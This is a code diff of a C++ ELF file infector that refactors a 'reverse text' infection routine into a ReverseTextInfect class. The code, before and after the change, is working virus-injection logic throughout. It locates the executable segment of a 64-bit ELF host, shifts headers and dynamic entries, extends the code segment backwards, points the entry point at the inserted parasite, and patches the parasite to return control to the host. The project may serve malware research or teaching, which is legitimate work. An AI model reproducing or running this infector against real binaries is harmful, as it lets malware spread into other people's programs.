@@ -8,17 +8,12 @@
 
 namespace vt::infector {
 namespace {
-struct ElfReverseTextInfo {
-  Elf64_Addr original_e_entry;
-  Elf64_Addr original_code_segment_p_vaddr;
-  Elf64_Addr original_code_segment_file_offset;
-  size_t code_segment_idx;
-};
-
 uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }
 
 bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
-               size_t padded_virus_size, const ElfReverseTextInfo& info) {
+               size_t padded_virus_size,
+               Elf64_Off original_code_segment_file_offset,
+               Elf64_Addr original_code_segment_p_vaddr) {
   // Point shdr (Pointer to iterate over SHT)
   auto section_entry_start = &shdr;
 
@@ -28,12 +23,12 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
       continue;
     }
     // Shift file offset for sections to accommodate virus
-    if (cur_entry->sh_offset >= info.original_code_segment_file_offset) {
+    if (cur_entry->sh_offset >= original_code_segment_file_offset) {
       cur_entry->sh_offset += padded_virus_size;
     }
     // Shift V Address
     if (cur_entry->sh_addr &&
-        cur_entry->sh_addr <= info.original_code_segment_p_vaddr) {
+        cur_entry->sh_addr <= original_code_segment_p_vaddr) {
       cur_entry->sh_addr -= padded_virus_size;
     }
   }
@@ -62,7 +57,10 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
 // CODE will be shifted back.
 //
 void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
-                uint64_t padded_virus_size, const ElfReverseTextInfo& info) {
+                uint64_t padded_virus_size,
+                Elf64_Off original_code_segment_file_offset,
+                Elf64_Addr original_code_segment_p_vaddr,
+                size_t code_segment_idx) {
   auto pht_entry_count = ehdr.e_phnum;
 
   // Point to first phdr
@@ -71,12 +69,12 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
   for (size_t idx = 0; idx < pht_entry_count; idx++) {
     auto cur_entry = phdr_entry + idx;
     // Shift file offset for all segments that are after and including CODE.
-    if (cur_entry->p_offset > info.original_code_segment_file_offset) {
+    if (cur_entry->p_offset > original_code_segment_file_offset) {
       cur_entry->p_offset += padded_virus_size;
     }
 
     // Shift vaddr for all segments that are before and including CODE.
-    if (cur_entry->p_vaddr <= info.original_code_segment_p_vaddr) {
+    if (cur_entry->p_vaddr <= original_code_segment_p_vaddr) {
       if (cur_entry->p_vaddr) {
         cur_entry->p_vaddr -= padded_virus_size;
       }
@@ -86,7 +84,7 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
     }
 
     // Handle CODE segment
-    if (idx == info.code_segment_idx) {
+    if (idx == code_segment_idx) {
       // extending CODE segment backwards.
       cur_entry->p_filesz += padded_virus_size;
       cur_entry->p_memsz += padded_virus_size;
@@ -94,12 +92,13 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
   }
 }
 
-void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
+void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
+                Elf64_Off original_code_segment_file_offset,
                 uint64_t padded_virus_size) {
   if (ehdr.e_type == ET_EXEC) {
-    ehdr.e_entry = info.original_code_segment_p_vaddr - padded_virus_size;
+    ehdr.e_entry = original_code_segment_p_vaddr - padded_virus_size;
     // virus inserted after ehdr.
-    if (info.original_code_segment_file_offset == 0) {
+    if (original_code_segment_file_offset == 0) {
       ehdr.e_entry += sizeof(Elf64_Ehdr);
     }
   } else {
@@ -111,7 +110,7 @@ void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
   // section header always comes after the virus.
   ehdr.e_shoff += padded_virus_size;
 
-  if (info.original_code_segment_file_offset == 0) {
+  if (original_code_segment_file_offset == 0) {
     // This means CODE starts from offset 0 and virus is inserted after ehdr but
     // before phdr. otherwise, virus is inserted after phdr.
     ehdr.e_phoff += padded_virus_size;
@@ -141,8 +140,10 @@ bool does_entry_contain_address(Elf64_Xword tag) {
 // the firs byte of CODE (where we insert the virus).
 bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                   const Elf64_Ehdr& ehdr, const Elf64_Shdr& shdr,
-                  const ElfReverseTextInfo& info, uint64_t padded_virus_size) {
-  if (info.original_code_segment_file_offset == 0) {
+                  Elf64_Off original_code_segment_file_offset,
+                  Elf64_Addr original_code_segment_p_vaddr,
+                  uint64_t padded_virus_size) {
+  if (original_code_segment_file_offset == 0) {
     // if there is no vaddr adjustment to gnu hash section, skip.
     return true;
   }
@@ -161,7 +162,7 @@ bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
       while (dynamic_section_entry->d_tag != DT_NULL) {
         if (does_entry_contain_address(dynamic_section_entry->d_tag)) {
           if (dynamic_section_entry->d_un.d_ptr <
-              info.original_code_segment_p_vaddr) {
+              original_code_segment_p_vaddr) {
             dynamic_section_entry->d_un.d_ptr -= padded_virus_size;
           }
         }
@@ -173,31 +174,11 @@ bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   return false;
 }
 
-bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
-              ElfReverseTextInfo& info) {
-  info.original_e_entry = ehdr.e_entry;
-  // Point to first entry in PHT
-  const Elf64_Phdr* phdr_entry = &phdr;
-
-  // Parse PHT entries
-  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
-    // Find the CODE Segment (containing RX section)
-    if (phdr_entry->p_type == PT_LOAD && phdr_entry->p_flags == (PF_R | PF_X)) {
-      info.code_segment_idx = i;
-      info.original_code_segment_p_vaddr = phdr_entry->p_vaddr;
-      info.original_code_segment_file_offset = phdr_entry->p_offset;
-      return true;
-    }
-  }
-
-  return false;
-}
-
 size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                     const vt::common::Mmap<PROT_READ>& parasite_mapping,
                     const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
-                    const ElfReverseTextInfo& info) {
-  Elf64_Addr virus_insert_offset = info.original_code_segment_file_offset;
+                    Elf64_Off original_code_segment_file_offset) {
+  Elf64_Addr virus_insert_offset = original_code_segment_file_offset;
   if (virus_insert_offset == 0) {
     // If CODE includes ehdr, inject after it.
     virus_insert_offset += sizeof(Elf64_Ehdr);
@@ -221,64 +202,91 @@ size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
 
 }  // namespace
 
-bool reverse_text_infect64(
+bool ReverseTextInfect::infect(
     vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     vt::common::Mmap<PROT_READ> parasite_mapping) {
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
-      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
-    return false;
-  }
-
-  ElfReverseTextInfo info{};
-  auto& phdr =
-      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
-
-  if (!get_info(ehdr, phdr, info)) {
-    return false;
-  }
 
   auto padded_virus_size = round_up_to_page(parasite_mapping.size());
 
   {
-    const auto& ehdr =
-        *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
     const auto& shdr = *reinterpret_cast<const Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
     // Patch .dynamic section if we touched .gnu.hash
-    patch_dyamic(host_mapping, ehdr, shdr, info, padded_virus_size);
+    patch_dyamic(host_mapping, ehdr, shdr, original_code_segment_file_offset_,
+                 original_code_segment_p_vaddr_, padded_virus_size);
   }
 
   {
     auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
         host_mapping.mutable_base() + ehdr.e_phoff);
-    patch_phdr(ehdr, mutable_phdr, padded_virus_size, info);
+    patch_phdr(ehdr, mutable_phdr, padded_virus_size,
+               original_code_segment_file_offset_,
+               original_code_segment_p_vaddr_, code_segment_idx_);
   }
 
   {
     auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
-    patch_sht(ehdr, mutable_shdr, padded_virus_size, info);
+    patch_sht(ehdr, mutable_shdr, padded_virus_size,
+              original_code_segment_file_offset_,
+              original_code_segment_p_vaddr_);
   }
 
   {
     // Patch elf header last
     auto& mutable_ehdr =
         *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
-    patch_ehdr(mutable_ehdr, info, padded_virus_size);
+    patch_ehdr(mutable_ehdr, original_code_segment_p_vaddr_,
+               original_code_segment_file_offset_, padded_virus_size);
   }
 
-  auto virus_offset = inject_virus(host_mapping, parasite_mapping, ehdr,
-                                   padded_virus_size, info);
+  auto virus_offset =
+      inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size,
+                   original_code_segment_file_offset_);
 
   // Patch parasite to resume host code after execution.
   return patch_parasite_and_relinquish_control(
-      ehdr.e_type, info.original_e_entry, ehdr.e_entry, virus_offset,
+      ehdr.e_type, original_e_entry_, ehdr.e_entry, virus_offset,
       parasite_mapping.size(), host_mapping);
 }
 
-size_t ReverseTextInfect::output_size(size_t host_size, size_t parasite_size) {
-  return host_size + round_up_to_page(parasite_size);
+bool ReverseTextInfect::analyze(
+    const common::Mmap<PROT_READ>& host_mapping,
+    const common::Mmap<PROT_READ>& parasite_mapping) {
+  host_size_ = host_mapping.size();
+  parasite_size_ = parasite_mapping.size();
+
+  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+
+  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
+      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
+    return false;
+  }
+
+  const auto& phdr =
+      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
+
+  original_e_entry_ = ehdr.e_entry;
+  // Point to first entry in PHT
+  const Elf64_Phdr* phdr_entry = &phdr;
+
+  // Parse PHT entries
+  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
+    // Find the CODE Segment (containing RX section)
+    if (phdr_entry->p_type == PT_LOAD && phdr_entry->p_flags == (PF_R | PF_X)) {
+      code_segment_idx_ = i;
+      original_code_segment_p_vaddr_ = phdr_entry->p_vaddr;
+      original_code_segment_file_offset_ = phdr_entry->p_offset;
+      return true;
+    }
+  }
+
+  return false;
+}
+
+size_t ReverseTextInfect::injected_host_size() {
+  return host_size_ + round_up_to_page(parasite_size_);
 }
 
 }  // namespace vt::infector
